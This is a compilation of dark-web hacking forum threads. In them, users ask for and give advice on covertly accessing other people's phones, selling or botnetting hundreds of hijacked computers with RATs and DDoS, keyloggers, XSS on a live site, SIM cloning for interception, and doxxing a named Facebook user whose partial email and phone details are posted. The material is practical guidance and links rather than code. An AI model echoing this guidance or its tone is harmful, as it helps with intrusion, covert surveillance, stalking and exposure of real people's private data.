I seen some people here talking about how you could identify users by many things like how the act what they click and behaviors of the user,But that is literally nonsense.Anyway, If you want to learn something, learn it from the best, so where should we learn tracking, Ads companies(GoogleAds, DobleClick, etc).    what those companies are now using is Audio Fingerprint(AudioContext Fingerprint) which is simply manipulating the audio API in JS with a specific sequence  and record the results, those results are based on the user hardware(The browser dose not have an impact on those results), so if you get fingerprinted from any browser/IP/network/proxy You will always get the same fingerprint as long your hardware is the same.You can test what I'm saying here throw Tor browser than try a normal browser, and see how its easy to know which user is on the site :        https://audiofingerprint.openwpm.com/ (clearnet) nothing is registered here, since its a POC.
Hello, I am working on a code which tries to identify a user who returns to a given website with a different IP/identity.The assumption is that each user has some specific behavior when interacting with the Web, that makes it slightly different from the other users. So, the idea is to model the users behavior on the website:- what do the user visit first- how he clicks (frequency, positions etc)- his writing style and duration when typing- how he select things on the website (and what he selects)- interaction with items of the website- etc ... and many other features.Lot of this stuff is based on statistical learning.Who has experience with this ? I don't even know if such a solution already exist or not. Do you have more information and ideas about this ?topman.
~
I think this is really awesome too.There are things like this around, with the boom of machine learning and cloud computing i am sure that many entities are using this principle more and more.However, i believe that the "AI" tech still much more accessible for academic research than information security minded.The AI frameworks are still complicated, at least for me. I tried some things such as the R lang and some open source C libraries, even tried i course and statistical computing still look like math sorcery to me.Anyway, one can create many layers of processing with neural networks. Including matching typos, interval between posts, cultural/religious biasing, contacts, relationship on the login activity, depth of knowledge on different subjects and so on.Here is one of few software that features some of such things, its really impressive information gathering software, however its proprietary licenced ;/Maltego {surface} - >https://www.paterva.com/web7/docs/use_cases.phpMaybe someone got an open source alternative, related software or framework?It would be great to know more!Ada.
@ada thanks for the additional possible features like matching typos, interval between posts etc ...Yes it would be nice if we can find some open source software which do things that are closely related to what I was describing. I am not sure if such thing exists. I just know that big companies like Amazon already do some similar stuff by modeling the user behavior/profile through his interaction with different products on the online marketplace. This may be conceptually similar to what I described but it is intended for another objective (marketing, advertisement, recommendation etc).

I have been searching around for how to create a client that can connect to tor, but haven't found anything that actually explains anything. How does one go about doing this, could i write it using purely a socket library? Any help would be great :)
Btw, even if it is a lot of hard work to write one i am willing to do so.
Your question is not clear as you may think, are you looking to make a script that can get something throw tor network, or making a Tor server which other applications can use?
I managed to put teamviewer on a computer that is in a network with over 500 computers and I am able to connect to all of them through windows remote desktop connection.On all of them I have a full GUI. The upload and download speeds are insane though the average system requirments kinda suck. But I have no idea what I should even do with all of these? Is there a way I could mine for lite coin or BTC? or should I simply sell access?
I would sell access, tho through teamviewer - nobody would buy it.It's a third party vpn... guess who has the logs for the logins.... take the time to setup RDP and sell.I personally have interest if it's possible for you to setup a clustered compute cycles, like a personal micro-supercomputer. My custom dictionaries usually crack passwords within 2 days with my double i7's but... I would indeed have use for those, as time is something I would give some BTC's for.
There is a possibility "Black Hat USA 2014 - CloudBots - Harvesting Crypto Coins like a Botnet Farmer" https://www.youtube.com/watch?v=cpUtYq4SJKA Here is an example. (clearnet)
If you have on them acces to install, why not infect them one by one with a RAT like Darkcomet or other to handle them better. If you infect 20 or 30 a day in less than 2 weeks you get all ready to sell or hire or using by yourself.
How did you find that ? 
That is a damn fine zombie army...
The problem that comes to mind is that every time you access them via Teamviewer and then log out, on each computer accessed the TeamViewer window remains open with the message "Thank you for using TeamViewer." That is, you likely had access. 
Sell them as bots basixly sell them as install and updates just make sure files u run on the PC's is fud with download and upload speed being 'insane' as you said you can get  a good price would sell them as ddos bots then 
Well, with a couple of days, you could make a super computer. About selling them, It depends in their internet speed, if each one have its own public IP, If you have a root access(admin in windows, It can be bypassed tho), If it have an SMTP connected to it or the network. If its not just some kind virtualization.
Anyone have an opinon on how safe TorGuard VPN's really are? They make some pretty bold claims to support privacy I was just wondering if anyone can back them on there claims or has information on there statements and the company.They claim to log nothing..They seem legit but seeming is not fact.Any details would be great!--Zackfa!con
I use it allot and yeah 1 year later I am saying this don't judge me.
Hello everyone,Let me introduce myself quickly first:I've been hacking for a lot of years, I'm into all types of hacking, I have my own blog https://dotcppfile.wordpress.com/ where I've posted few interesting tutorials and tools, here's my github https://github.com/dotcppfile where you can find some of my repositories and specially DAws which is the strongest web shell in the hacking scene.I have many certificates including all the CCNAs of Cisco.I'm the leader of Team Salvation which some of you may have heard of. We've developed various things like Vigil(private data lookup), Nixbot(advanced linux botnet/ring 3 rootkit), WHFramework(web hacking framework), etc... (none of these tools is on the clearnet, they get shared among people we trust, we'll give you copies if you give us valid reasons or if you are one of my students...)I recently joined the SIN team and we're gonna start working on an interesting project that Iron Soldier will mention really soon.I've been teaching it's been 3 years and here I am mentioning that on Intel Exchange.Contact me on jabber(dotcppfile@radiodd.de).That is all,dotcppfile.PS: I have a big number of students and I can't handle a bigger number, I'll let you all know whenever I'm free again to do so.
Greetings, I want to test your sql injector,the CppSqlInjector bout I haven't found any download link yet.It would be nice if you upload the tool on your Github
I may do that soon but not before I update the injector itself, it's a 2 years old project that I barely worked on for 2 months.
Good to know
@dotcppfile What does Vigil actually do? 
Vigil is an information gathering tool for people, it's for looking up full names, usernames, emails, etc... It'll be released soon by Aces, we think, because one of Sweden's police department took a look at it and had a lot of questioning about it and we believe that they'll buy it soon, if not then accounts will be sold. The reason it's taking so long is because Aces has a lot of plans for Vigil and is making deals with big data companies in Sweden as an investment where you basically pay per year for data that will be presented to the public under specific terms.
dotcppfile for president ! I give coocking clases .
@dotcppfile as a hacker what do you think of cybrog hawk vs Kali and other distros? I will definately check out your wordpress, and github. Thanks for the links.
haha @K1du we haven't talked in a while mate but we sure will, very soon.
@m0us3 it depends really. The reason you would chose any of these distros for an "everyday use" is simply because they make your life easier since everything you might use is there, configured and ready to be used. What makes a difference between these distros, that are apparently made for "pentesters", isn't the number of tools that they hold or any of this shit because the popular and useful tools are countable and most of these distro creators have been adding randomly everything which is stupid. What you should be interested in is what these distros are based on; if you like Arch Linux then go for BlackArch, if you like Debian then go for Kali, etc... Talking about the user interface would also matter when chosing because you'll be spending a long time with it lol so you need to check some interfaces like Gnome and KDE out and make up your mind.I am personally a fan of Debian and I enjoy Gnome which makes me a Kali Linux user.
@dotcppfile Thank you for your insight. I asked because I started out with my first linux distro, Ubuntu. I liked it as a desktop OS but was looking for something more towards what I want to do. Computer security, Network Security, etc. So I found Kali and I have to say I absolutely loved it. However I couldn't figure out how to fix the issue of the cross compiling to make the drivers for my Alfa wireless adapter. However Cyborg Hawk could make right off the bat. I also liked how they made sort of a cross between Ubuntu and Kali. However I still prefer the Debian based Distro's. Like I said I really loved Kali's minimal set up. However like I said it made getting drivers to work a pain in the ass. Do you have any thoughts on how I could get it to work? Overview in Kali:I went in to the MAKEFILE and changed the kernal version to the version I was using and directories etc. But when executing make from the terminal I get an error that it did not understand (off the top of my head) something about the cross compiling.In Cyborg Hawk: I simply extracted the tarballcd <dir><edited MAKEFILE same as I did in Kali correct dir and all>sudo makeinsmod 8012au.ko <if I remember it correctly>then depmod -adriver installed no problems.Any ideas?
Oh and would you mind teaching me? I still have a lot to learn but truly interested. Really anything you feel like teaching. 
It's been a while but anyways, contact me, we'll talk about it.
@m0us3Cyborg hawk is a really bad OS.what i did was to install cyborg, then proceeded to "steal" scripts, procs, and applications from cyborg and implemented to Kali 2.0the big whole: Cyborg hawk is shit-----------------@dotcppfileim looking for a nice layer 7 ddos tool.or maybe you could make a git/other repository from which we (us at IE) can get a chance to download your precious #Hacks xD//G0dR4pe
@G0dR4pe "precious #Hacks" lol, I do have a github account with 2 repos only, the link of the git account is in the main post, as for the ddos tool then nah not really lol, a public version of nixbot will be released on that same github account within a month, I hope, if we put some more work into it and we're pretty sure that everyone will like it because it simply shouldn't be free, at all lol.
@dotcppfile  Your email does not work. I tried to email you and it was an error. 
@Alpha0 that's not my email, that's my Jabber... You need to download a client like Pidgin and create a Jabber account on some server and then add me and we can talk there.
HiI have been hacking for about a year now and I wanted to increase my knowledge. How much would this cost? and do you accept Bitcoins?Thanks Logo
Add me and we will talk about it.
@dotcppfile   I have a hard time using pidgin. Do you have any other ways I can communicate with you?
No I don't @Alpha0
@dotcppfile, one question. I learned using metasploit to hack andriod(Smartphone) to test my skills. Somehow is it a way can hack like my family's phone if they are in a different place from me using their numbers? Do I have to be near by them to be the only way? I'm using msf, not sure if I have to use something else. 
@Alpha0 it depends on the exploit that you're using but as far as I know then there isn't much you can do using "exploits" to hack a smartphone from distance, you can always use social engineering, or whatever, to do so but it's not that interesting but would work with great results.
@Dotcppfile,  I remember hearing people were able to do it. Also by using numbers. Does "remote" mean, that person cell must be around me? If Social engineering must be done, where do I even begin? 
@Alpha0 I do not know tbh, I worked once with Mathew Beddoes (The Red Dragon) on a bluetooth hacking framework related to mobiles but I was never interested in remote "hacking" a phone, so I can't help you much with this one, I really can't, it's not something I know much about, but what I know is that there's the Mobile Hacking Framework that you can use, there's also a simple way to backdoor a Backdoored Iphone (https://www.youtube.com/watch?v=34VYX57vJm0 a video by Dyme, it's interesting), and other things that can be found in public. Good luck.
@Alpha0 Look up Ganjan_bot or GM Bot or also MazarBot, which uses SMS to infect and grab or exfiltrate data from android phones. Source code for Ganjan_bot was released early this year.
@vlaf01 That is true, the APK file bots, but this is just related to social engineering since it requires user interaction, anyways thanks for sharing that.
@vlaf01 Could not find any information of ganjan bot or anything else you provided. Are they kali linux program?
@Alpha0 they're all based on the APK concept, take a look at Dendroid for example: http://hackerz-inn.blogspot.com/2014/12/android-botnet-dendroid-step-by-step.html
@Alpha0. Sorry, I wasn't sure what exactly you were looking for. It is same as dotcppfile says. If you search for "Android GM Bot" on clear net, you can find info.
@dotcppfile.  I manage to do everything except one thing. Sending apk I made to the victim. How do I do that?   I'm stuck at  msf exploit (Handler):     What's next after that? I used armitage in kali linux and others. Is the same thing I'm struck at MSF EXPLOIT (Handler)  How do I send the victim the apk I create it? 
@Alpha0 sorry I was on a business trip. Anyways, there's many ways to get the APK file on the phone, just like I said, it's related to Social Engineering, whether you're going to fool the victim or try to use some exploit that would download and execute the APK file threw a link, a user interaction is required. As for the msf handler then it's just a connection handler if you're using a meterpreter payload; if it's a reverse handler then it'll tell you that a reverse connection session has been created AFTER the payload has been executed on the android phone.Take a look at this: http://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/ it explains how to create an apk version of meterpreter for android and how to set up a handler for it.
hey dot you mentioned you work with SIN. Do you know why the site is down?
@liquid I have been busy and haven't talked to the SIN team in a while now, but SIN going down sometimes isn't a big deal, it'll be up very soon and probably is already, there's a lot of work that gets put into SIN and the number of visitors increases daily like crazy, so bare with us mate.
Any XMPP hostnames you'd recommend? Dukgo is down
@dotcppfile would like to learn some shit dont have an email with anything rlly give me a sitr and ill make one and pls gimme your email so we can talk
 
Do you have any tutorials or links that would help somebody self learn since your booked up.
Bump
 it would be amazing if you could help me learn and i agree with Th3Arch1t3ct because i just dont know where to start honestly
The truth is that becoming a "hacker" isn't as complicated as you think, there's few simple steps that you need to start up with and then you can easily take it from there on your own, hit me on Jabber, I'm not giving anymore lessons because the number of students that I'm handling at the moment is more than I can take but I'll be pleased to at least tell you what to do and how to start.
Is there a way to hide the fact that there is VM installed on host OS (both Linux, different distros)? Is it enough to just encrypt it? Or use something like VeraCrypt? 
You won't conceal the fact that something is there, but you can conceal that it is a virtal image.  You could encrypt the entire hard drive, and then whatever is in there would be indistinguishable unless someone can access the computer's memory during run time (like if there was some malicious software in there too). 
Are there any forms of encryption that allow you to encrypt a file and require the unification of several different keys in order for it to be decrypted? I'm certain I read this somewhere, something like "horcrux encryption", but it was still in research/beta or something...
What would be the point?
Just found out IMEI is used to wiretap a phone. Anyone know the basics of it???
Wikipedia, the free encyclopedia said:The International Mobile Station Equipment Identity or IMEI /a����mi�/[1] is a number, usually unique,[2][3] to identify 3GPP (i.e., GSM, UMTS and LTE) and iDEN mobile phones, as well as some satellite phones. It is usually found printed inside the battery compartment of the phone, but can also be displayed on-screen on most phones by entering *#06# on the dialpad, or alongside other system information in the settings menu on smartphone operating systems.Search before asking?On the technical side, this is nothing more than another identifier that the providers (and agencies) can use to trace your movements, even if you change your SIM card.
http://www.makeuseof.com/tag/phones-imei-makeuseof-explains/ said:While it may be illegal to change the IMEI of a device, it does happen. Thieves in particular will attempt to take non-blacklisted numbers and apply them to their stolen devices in order to make them usable again. For this reason it comes highly recommended that you never share or post your IMEI online, else you may find that your device can be cloned. In the interests of ongoing investigations by authorities, an IMEI can be used when wiretapping a device as well.I don't rely much on wikipedia and i appreciate if you can send me links regarding this topic for educational purposes. 
As I already said, the IMEI is an identification number. Providers can trace you by looking where the phone with the given IMEI (and need to do so to stay connected to the phone), so wiretapping has nothing to do with the IMEI.
@The3coderyou rely on Wikipedia? xDit's filled with false information, because of the government is editing the entries, for easier manipulation of the sheep's (mankind)ex. you have always learn 2+2 = 4 but in reality its        2+2 = 5because of taxes. the educations don't learn us to count taxes in everything we do, but in reality we should.//G0dR4pe
@G0dR4pe:I don't RELY on wikipedia, I have pretty good knowledge of how (mobile) phone networks work, I just didn't bother to dig up a technical paper which describes in every detail what an IMEI is used for. For a small glance at a topic, wikipedia is okay: Not too much technical detail, yet a good broad overview, for more controversial topic, go see other sources.2+2=5? WTF are you bullshiting here?
@the3coder He is saying that the government tells you 2+2 = 4 and that is what you think through out your life, but infact it = 5. We all know it equals to 4 he is using that as a example on how the government tricks you through wiki. Not the best example but it worked for me :)
You have to look up the hand shake between the base station/provider and the handset.  You also need the authentication key which is locked in the SIM card (GSM/LTE phones) or some special chip in the CDMA phones.  It is easy enough (theoretically, I have never done it) to extract that key by cracking the cipher (this requires you have a base station, connect with the phone, send it a command to encrypt a message using its authentication key with the A5/1 or A5/2 cipher (which are weak apparently).  Then, being you know the message and the cipher, you can do a little reverse engineering (I think they have software for this), and bam you have the authentication key.  Once you have that you can start decrypting communications on 2G networks.  3G and 4G I think use additional authentication and sends out a unique encryption key for the session.  So you have to jam those services, otherwise you can't do much. 
The other good news is new Orthogonal Frequency Division Multiple Access, where they only rely on encryption and not frequency hopping like CDMA.  Anywho, NSA has all these keys (so says the conspiracy) so staying away from them is impossible. 
I've been hearing SQL Injection in quite a few places but i'm wondering how you actually perform one ?
https://www.udemy.com/blog/sql-injection-tutorial/There's a full tutorial, though I use Kali Linux. Kali Linux has something called sqlmap which you can use to do it.
Thanks Potchi 
You're Welcome. :)
Sqlmap is a good tool, but it is a slow method of attack perfessionals do attacks from the browser, along with slqmap, and other tools. 
This link seems to be down, any updated URL perhaps?
google sqlmap you can install it on basicly every linux distro 
 
Agggggghhhh Why is there so many threads censored! Jeez, this is why I don't bother opening new threads and commenting on threads any more. What the fuck happened to this forum!
This user is just playing around, it seems that this is not the only empty topic-title he opened.
Hello dear forum members! That is my first post here and i hope that you guys will see my activity here!I have been working for a while on a betting site for training.so far i found 2 xss exploits in the site chat (one because the site didn't had ANY script filters and the second after they made a filter only to the tag <script>) but im sure that the site has potential for more exploits that i did not found yet and i would appreciate any help from the forum members on that case.the site is: csgoluckywheel.comnow i know that right now there is one filter that just change the chars to a hex value and nothing more...any guiding will be great :p
ALL csgo gambling sites are going to go down within the next month. Court orders have been sent out to all of them. So there's no point any more. Since all these csgo sites were just a bunch of child gambling scams! Wouldve been awesome to attack them all and take them down hehehe :)
Does anyone have leads on a SIM emulator software?  The idea is to copy the data from an existing SIM, and then use that to connect to the network.  The goal isn't just to spoof, but do a MITM type thing.
I've seen quite a few people ask the same thing in the workshop. If you do find some emulation leads I'd advise caution because due to the latest T-mobile ETC 'hacks' everyone has been on high alert regarding this whole matter. You'd probably need a SIM reader that can act as a burner by the looks of things too.If you do get any leads, chuck some links over here!
I think I over thunk this one. After doing a little more research on this, I think trying to build a sim emulator is really just building a small app, that the baseband firmware can call functions on.I'm going to say a couple of "no-duh" things now:So a SIM is a microprocessor Smart Card, and has applications of its own.  The two important numbers that keep popping up are IMSI and Ki.  The Ki is the authentication key, which is used to encrypt or sign all communications. The encrypting is done on the SIM card, and is called through a function by the phone. We know the ciphers. We know the data we want to transmit. Once you get the Ki, you can put it all together. Being that the SIM is just running an application, all one needs to do is create those functions/class/library/app/whatever that encrypts things on the fly using those public ciphers.  That's it.Solution is to go dig through OsomocomBB find out where in there it calls the SIM function, create a "SIM" class that has all those functions, and BAM! We are cooking with gas.
Remember to do some tests and stuff on a decoy number that shouldn't trace back to you before executing what ever you plan to do with it. I get quite a few people come into the workshop asking for tips and tools so they can 'learn' but we both know that they want to do something malicious so just ensure you don't test it on any number linked to you. Cheers for the information by the way!
Well, I'm thinking I can test it on my phone.  Initially, I want to force the my phone off the network and obtain my own Ki.  Then I can spoof my phone on the network, and route all my communications through my system.  Theoretically, the network shouldn't know the difference as they only see one phone (my system), and my real phone never touches it.  I'm also going to have to build in something, where if my phone chooses another tower, that my system automatically cuts out.  Don't want the telecoms to think something was afoot.
Eh. I'd recommend buying some crap phone thats not tied to you, like some cheap eBay (or Walmart/Target if you're American) and then a cheap disposable phone. If you bugger this up it'll be both easy to trace, locate and punish you as you can be tracked through SIMs (regardless of whether they have power or not!)
Oh OK. To be honest though, I'm probably not going to make this, hahaha.
Even more of a reason to ensure it doesn't trace back to you. Most people who get caught doing this get caught because they did half the job and let it trace back to them. I'd be interested in seeing the results if you do try it however
I'm working as an assistant network admin. If you have materials or links you can share I really need one. Thanks!
What are you trying to do with it? Tutorials is a vast term when combined with Windows servers. And I'm sure google, youtube and Microsoft are your friends for stuff like that. Surface sites like these might be OK (http://www.visualwin.com/), Doubt you need a small deepweb forum for this. Honestly just try a Microsoft one as they are more populatedGood luck!

Hi everybody,I am looking for any resources related to online marketing and affiliate marketing. Any resources are welcome (whitehat or blackhat). Thank you!
google adwords, google analytics, create a website, use social media.
i am looking for a Stealth Keylogging program that i can put onto a usb.I have a very very small usb that i just want to plug in and walk awayi am looking for a program that will make the computer think its a keyboard so i can record all the keystrokes but when looking in hardware or devices on the computer not show upIs there such a thing                Thank you,
No. When you insert a "keyboard" it will show up as such. What you're looking for, is a device that sits in the path between the actual keyboard and the computer and intercepts signals from the actual keyboard. By doing this, the device doesn't need to announce itself on the USB bus.
use a keylogger module you can add it inside the keyboard itself.
What is a keyboard module ? 
What you need is a device witch is inserted between keyboard and Computer, witch is actually really easy to get amazon does the trick.http://www.amazon.com/s/ref=nb_sb_noss?url=search-alias%3Daps&field-keywords=Keylogger
I didnt even know that thoes things still exist , wouldnt be easier to make a keyllogger by yourself ? most of the keylogs can be send via email .Cant remember the name right now but there are a few of them out there very practical.
I find that Adramax works quite well and no additional hardware is needed to use it. You can get it for free from thepiratebay.
The clearnet web or the DW one ? 
This may not be helpful but I found it interesting at the time and perhaps it's still relevant... years ago when TechTV was good, they used to have a, "dark tips" section on one of their shows.  This guy was demonstrating detecting RF emission from a keyboard for each key pressed.  What's more is that each key produced a unique signal.  He hooked up an analog TV closeby, and put it on a station with static.  Each key would make a slightly different variation in the static as it were pressed.  Using a DVR he could record the static and, once learning the picture recognition of each key, determine without any installed hardware or software the keys which were pressed.Arachaic and cumbersome I know, but thought I'd share anyway.
Hi people, so I tried Ardamax from TPB. Always when I download something I run a virus scan. The virus scan found this: Trojan.agent/Gen-PWStealer. Is this a serious threat for my computer, or is the virus scan not smart enough to distinguish a keylogger from a Trojan?Thanks in advance.
If you ask me i will not mess with something that says "Torgan".Maybe you downloaded a virus. 
That does not make sense, virus is different from Trojan. But I will keep an eye out for the Torgan, is that also something the Greeks invented?
Just write a python keylogger. it's pretty easy, just look it up on google.
I have AirCrack on Windows but it appears to not work overly effectively in windows. I'm open to learning about particular programs or techniques to crack a router and or a computer
The first thing you should learn in this field is toSTOP USING WINDOWStake a look at thishttp://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=13664
I understand about learning more about javascript ,python and etc. Where do you begin to hack into someones' android/cellphone device? It will be good for parents to watch over their teenagers on the messenger and phone. If so, Can you see over other messenger apps and such? Please list what to do? 
Easiest way is to put an app on the device that does something similar a keylogger would. Tracking the opening of apps and the typing of virtual keyboard. Never done it before so can't suggest any.
Google it man, I have hacked and rooted androids and they are surprisingly easy once the phone is rooted you have access to everything on that phone after that its up to you what you do with that access. Most of the time like nick said a app will work as well, if the device is accessable install two apps, one called airdroid and second a "app hidder" make a account on airdroid and hade the app with the "app hidder" you insalled you can see all the messages and apps on the phone as long as they are on the same wifi network (if you pay you can access it anywhere) AND as a bonus if the device is rooted then you can even see exatly what is on screen and even activate the camera remotly.
Here's the trick then, chaps.How to root an Android WITHOUT having physical access to the targeted device. And WITHOUT some kind of social trick (getting the owner of the device to download a particular app and install it).Now...how is THAT done?
You would have to either hack one of the apps your target uses, or the OS itself. From there you can try to gain root access.

the3coder  Thanks but one question. Where do you even begin to even hack one of the apps? How should I do it? Are there like steps I can see and follow?
T0ng5.   Can I hack at cellphone using my computer and view from there? 
T0ng5.   Can I hack at cellphone using my computer and view from there? 
Alpha0, you would have to be on the same network as the target, from there start learning how to use metasploit and tools alike, which can find and exploit vulnerabilities in the devices. Furthermore, just as an idea, this is kind of an advanced level, perform a man-in-the-middle attack (this is the easy bit) and then try injecting malicious code (this is the hard bit). Also I would strongly suggest learning how to cover your tracks...H4T_TR1CK, remove the sim & the battery (that's all you can do really without taking the phone apart), there are myths that even after you remove the battery, there are internal capacitors which may provide enough charge for the phone to be tracked for some time (an hour they say)... and yo, don't do it, I found that in life, generally, "what goes around - comes around" works... 
sorry bud been travling uumm depends on your ability to code and think outside the box, think of the phone as a boat at sea the most direct way is take another boat but there are many other ways, from a airdrop to swimming.  KInda hidden on new phones (click the build number 7 times to unlock hidden dev settings)there is a option for a wireless debugging (connect to the PC over wifi) so that could work somehow.  @ quark what if it is a cdma phone? phones are computers, they also have a cmos battery.@h4t_tr1ck if you dont want the phone take out the battery and break it over your knee and toss it in the trash, if your a sissy then drop it in some water with the battery still in it.  if you want the phone for use you would have to basicly be in a lead box to power the phone on (so it would not ping), then try to hack the phone to change the mied (the phones carriers id number (also relates to how cloning works(like in the nick cage movie, national something))).  but they would stop looking after a while but it still could not be used on any carriers plan because it has a locked mied. 
you could always try to get him to install a "kill switch" (this would be like shooting a rpg at the boat) and all it would do would brick the OS (if you have access to the phone then this can be done super easy, if not then it has other problems).but if he is just a jerk stick with something not going to get you arrested, get a hold of his phone for like 5 minutes and find the button combo for that phone (when powering on hold like the vol up or down and if its a galaxy the the home button might be in there as well)to access the factory installed recovery and scroll down to "CLEAR ALL DATA" or "FACTORY RESET" and then reboot (does not matter if the phone has a lock on it, but it wont after that ;-). having your phone reset is a pain in the neck.
@Quark  Do you have site that I can study metasploit? What if the person turn is phone off and I'm trying to hack is messenger apps? I had trouble understanding.So are there google apps that allow cellphone AND messenger apps hacking? So if my teen is using foreign messenger apps such as kakao, I am able to read it? If so do you guys know any good recommendation?really like to know the process.
Does anyone knows how to hack someone's cell phone without having their cellphone? Please anyone tell me about it. You guys spoke about apps and told me google it. I have a hard time finding it. Do you know what this product is called?
Define I have to be in the same network when hacking a cellphone?
Your phone (with root)  Google Play > Bugtroid Pro  (I think it was around 5 dollars)A lot of useful 'Security Penetration' testing apps available... Find a few that sound like what you're trying to do, and Google how to use them...I would love to believe this is just a concerned parent, but generally this is exploited as a means to hack others (which I'm not against, but would rather know exactly what you're trying to do...)BlueSnarf if still a great tool if you know how to spoof your test phone (cough victim)
@umbra3   Doesn't that means I need their phones around me? What if I am not able to get hold of their phones?
@tongs or anyone.   What if I am not in the same network wifi as the other person. If they are in school, can I still hack their phones?
@Alpha0 Did you find a way to do it? I am interested too. Not for real "hacking" but for my self-education. Imagine I want to get acces to my own phone and have no way to install aps or root it or what ever physically. I am interested in how you have done this.GreetingsVisitor
Yes I have. I used kali linux and msfvenom
Me and an Estonian friend have tried making several ciphers that couldn't in principle be brute forced, a cipher outside even the possibility of being brute forced, and we think we did it.

A potential problem with this cipher is that it expands by a significant amount. For example, of the encrypted text above, the original text was only 27 characters long. Of course there is a slider-scale we implemented as a noise filter, so the output can be reduced by about 20%, but it's still a lot. What do you guys think?
Please comment here when you will upload the source code. Seems interesting. Good job!
Tbh fam it might be a while before I upload the source, we still haven't figured out if it's always 5D lol. The way it works is basically a bunch of nested tables, but you can get the same letter from a bunch of different table locations so you could potentially pull the character from only three tables in (3D) instead of five tables in (5D), so we want to make sure it can't be broken without the cipher.
Hello folks. I am interested in methods to access a smartphone (see pictures, SMS, Whatsapp, music, downloads, apps, etc.) without permission. Of course the "victim" should not notice it. I want to test it on my own phone (latest Android) and maybe i will ask a friend to try it on his phone. So.. what software could I use, how to do it? Is it possible with just having the number and nothing else? Please teach and advise me. GreetingsVisitor 
The easiest way would be to get hold of the phone and install an app which allows you to get into it.
Yeah, thought of that. But unfortunately, that is not possible if the person is far away and I want the access now... Of course I can do that with my own phone but that wouldn't be exactly what I want. But thank you 
Most people asking a question like this, expect that there is some kind of magic trick/backdoor or tutorial which allows them to gain access to somebodies device. Unfortunately, that's not the case.So if you don't have physical access, the next easiest thing would be to find out the operating system of the target's phone. After that you can create an app which allows you access.I guess that you know the person to some extend. So by social engineering you could find out what kind of (simple) app the person would trust and want to install. Create it, hide some remote access capabilities in there, and make the person install the app.
Hello dear forum members.I have been working for a while on a textual browser in python.The browser will contain the following functions:Arp_Req(IP) returns the MAC address of a given IP addressDNS_Req(URL) creates a DNS query to 8.8.8.8 and returns the IPRet_From_Cache(URL) returns the IP of the URL from the internal DNS table if exists , else - return None.Flush_DNS() This function delete all content of the DNS caching file and the content of the dns tableAny support will be usefulRegards Oblivion_Creed
I just want to know a good tor email service, I've been looking for one for a while but I haven't found anything yet. I also wanted to know how to upload stuff in tor.
Really? No one has answered you yet?  Sigaint: http://sigaintevyh2rzvw.onion/What do you mean upload stuff in tor?  You do it through the browser like any other website.  Given the site has to have that functionality. 
Hello,I want to set up a hidden service in Tor but Tor says it's insecure to set it up on an existing Tor relay because it makes it easier to reveal the location of the server.My question is as follows:I want to set up a hidden service on my Tor relay, but I don't want to give the link to anybody. It should be for personal use only. Is it possible to discover my Tor Hidden Service if I don't give its onion-url to anyone?
Are you trying to glean info from those using your relay? (asks in a tone similar to an adult to a child)
So a while ago,  in another life,  through my job and people I worked with I had access to some really cool apps available only to DOD... the phone issued was an android platform. Does anyone have downloads/access to DOD apps? I'd gladly pay for them,  or trade. One app was really cool,  it used (I was told) rfid to communicate with a cars ecm and security to unlock and start it- anything newer than 94 with the license plate number
Uh huh... So, I don't think that's how it works.  The license plate number is no way associated with the manufacture of a car, so that would mean that this device could connect with whatever DMV and the records that associate the license plate with the VIN Number.  The problem I have with this is the DoD doesn't have access to DMVs.  Now, it is possible to gain access to other nations DMVs, and then go from there, but this means every manufacturer's ECM is the same, or there is a massive database on the phone? These ECM's are not complex, but to my understanding they have proprietary code (like real basic stuff), but it is not encoded the same.  Each digit/character/byte/whatever means completely different things even among the same manufacturer depending on year. Next is the security of these vehicles.  Just because there is a receiver that accepts some radio frequency code to unlock the door doesn't mean that it is capable of taking that code and then listen to coded instructions to do other stuff. 1994 is not known as the pinnacle of automotive technology.  You literally have to turn the key to connect the starter circuit.  If you watch those videos on how the real hackers take control of the vehicle, they wire in a device like a Raspberry PI or something to the vehicle, that can communicate.  Sure, it can take all of 5 minutes to hook it up, but you still need something that can listen to the commands you give and then tell the car to follow them; furthermore, the vehicle must also be physically capable of following the commands, like starting it, and unlocking the steering column.Cars in the last 5-10 years, depending on model, I am thoroughly convinced that they can easily be taken over.  However, they are getting increasingly more complex the more media shines light on this issue.

hidden wiki?contain all the info you need
Hello there!I was wondering, does anybody here compete in programming.If there is, what are good sources for getting better at it?
Here are two known sites:https://growthhackers.com/welcomehttps://softwareskills.se
Thank you!
The following site got challenges on many languages, challenges goes from simple hello world to complex math algorithms.https://www.hackerrank.com -surface-I believe that the best way to get better is to dig deep into algorithms part of computer science.The following libraries got many computer related bookshttp://xfmro77i3lixucja.onion/search/?num=200&q=computerhttp://booksurubeyy6ctp.onion/index.phpThe content on the following onion is old but still relevanthttp://akmb7t5w56jcfgwf.onion/books/sorted/http://c3jembnkdnbcdniu.onionHere you find a list with more librarieshttp://mx7rwxcountermqh.onion
My question: How can you get the phone number of a Facebook friend? Obviously they can hide the number in their profile, but they are connected to their accounts, so there must be any way. This is the account: https://www.facebook.com/lola.fillep. I already got one Email: lolafillep@web.de and from the second one she has got bond to her account I have parts: l**********k@gmx.de. I also know that she has two phone numbers in her account, but they aren't completely visible (I got them by trying to reset the password): Phone 1: +49*********48 and Phone 2: +49*********87I would really appreciate some help. Thanks!!!
Just ask if it is a friend
are there any DDOS services here in onionland? links would be  appreciated
I've seen them around. Look for hacking services on the Hidden Wiki or !Evil or Candle. If you find one, it's most likely a paid hacking service which provides DDoS attacks.As with everything on the dark net, you have to dig deep.
I have heard this name HORNET, which is supposed to be so much better than tor. However my research has thus far proven not fruitful so I am asking anyone to share any info they have about this. 
Interesting subject.HORNET stands for High-speed Onion Routing at the Network LayerI searched a bit and it seems to be only academic research and is not available yet. However it seems promising, we all know that tor speed sucks and HORNET seems to be a scalable solution for the overhead experienced here at tor.Anyway, one must keep in mind that even when this network become available it will need even more time to users get used to it. Also it will not be a fully encrypted network by design and thus it may spell less security for more speed.Here are some links at -=[shallownet]=-The original paper from the research teamhttp://arxiv.org/pdf/1507.05724v1.pdfRecent post at Anon HQhttp://anonhq.com/hornet-alternative-tor-network/
Hello Everyone.Was wondering if anyone in this vast ocean of knowledge would happen to know of any informative books for learning black hat python?Thank you all in advance,AG
